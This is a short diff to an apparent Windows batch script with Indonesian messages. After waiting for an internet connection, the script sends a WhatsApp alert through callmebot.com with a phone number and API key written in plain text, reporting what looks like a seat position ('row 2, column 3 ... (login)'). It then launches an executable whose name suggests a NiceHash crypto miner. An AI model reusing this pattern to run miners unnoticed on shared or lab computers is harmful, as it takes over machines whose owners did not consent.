@@ -20,7 +20,19 @@ winget install wget2
 
 ---------
 ::script
-curl -A 'chrome' "api.callmebot.com/whatsapp.php?phone=6285161635881&text=baris2,kolom3+\ndari+ujung+(login)&apikey=3754570"
+
+@echo off
+:check
+ping -n 1 google.com >nul 2>&1
+if errorlevel 1 (
+    echo Tidak ada koneksi internet
+    timeout /t 5 >nul
+    goto check
+) else (
+    echo Terhubung ke internet
+    curl -A 'chrome' "api.callmebot.com/whatsapp.php?phone=6285161635881&text=baris2,kolom3+\ndari+ujung+(login)&apikey=3754570"
+	  C:/Users/kampu/nhm_windows_3.1.1.2.exe
+)
 
 
 
